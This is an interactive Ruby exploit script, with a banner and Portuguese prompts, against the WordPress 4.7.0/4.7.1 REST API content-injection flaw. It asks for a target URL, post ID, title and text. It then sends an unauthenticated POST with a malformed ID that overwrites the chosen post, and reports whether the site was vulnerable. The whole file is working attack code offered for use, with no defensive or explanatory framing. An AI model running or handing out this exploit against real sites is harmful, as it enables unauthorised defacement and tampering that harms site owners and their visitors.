# WordPress 4.7.0/4.7.1 Unauthenticated Content Injection

system "clear"
require 'json'
require 'rest-client'
banner = '''
3Xpl01T b0X By:
       .__    ____        _____  
  _____|  |__/_   |__  __/  |  | 
 /  ___/  |  \|   \  \/ /   |  |_
 \___ \|   Y  \   |\   /    ^   /
/____  >___|  /___| \_/\____   | 
     \/     \/              |__| 

'''

puts "\033[31m#{banner}\033[0m"
print "[\033[36m+\033[0m] Coloque a URL ex:(www.): "
url = gets.chomp
print "\n[\033[36m+\033[0m] Coloque o ID : " 
id = gets.chomp.to_i
print  "\n[\033[36m+\033[0m] Coloque o titulo da postagem : " 
title = gets.chomp
print "\n[\033[36m+\033[0m] Coloque sua postagem : " 
content = gets.chomp

response = RestClient.post(
	"#{url}/index.php/wp-json/wp/v2/posts/#{id}",
	{
		"id" => "#{id}justrawdata",
		"title" => "#{title}",
		"content" => "#{content}"

	}.to_json,
	:content_type => :json,
	:accept => :json
) 	{|response, request, result| response}
if(response.code == 200)
puts "\n[\033[36m+\033[0m]Funcionou! 'http://#{url}/index.php?p=#{id}'\n"
else
puts "\n[\e[31m-\033[0m] Site nao e vulneravel\n" 
puts [nil]

end




